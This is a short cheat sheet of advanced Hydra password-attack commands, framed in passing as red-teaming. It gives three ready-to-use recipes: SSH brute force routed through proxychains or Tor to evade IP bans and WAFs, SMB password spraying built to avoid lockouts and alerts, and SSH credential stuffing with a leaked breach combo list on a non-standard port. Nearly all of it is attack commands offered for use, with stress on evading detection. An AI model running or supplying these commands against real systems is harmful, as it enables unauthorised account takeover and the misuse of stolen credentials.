# 🔥 04. The Best Combination Cheat Sheet (Advanced)

## Combo 1: Stealth Mode (Bypassing WAF / IP Bans)
**Scenario:** Target blocks your IP after 10 failed attempts.
**Command:**
`proxychains4 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4 -vV -f`
*   **Why it's best:** Routes traffic through Tor or proxy servers. Every request comes from a different IP.

## Combo 2: Password Spraying (Beating Account Lockouts)
**Scenario:** Company locks accounts after 3 failed attempts.
**Command:**
`hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p "Company@2024!" smb://<TARGET_IP> -t 4 -vV -f`
*   **Why it's best:** Hits 1000 users with ONE highly probable password. No accounts get locked, maximizing success without triggering alerts.

## Combo 3: Non-Standard Port + Custom Combo List
**Scenario:** You found a data breach containing `user:pass` pairs and the admin moved SSH to port 2222.
**Command:**
`hydra -C /home/kali/Downloads/leaked_combo.txt ssh://<TARGET_IP> -s 2222 -t 4 -vV -f`
*   **Why it's best:** Uses actual leaked credentials (`-C`) and targets the hidden port (`-s 2222`). Deadly combination for Red Teaming.
*
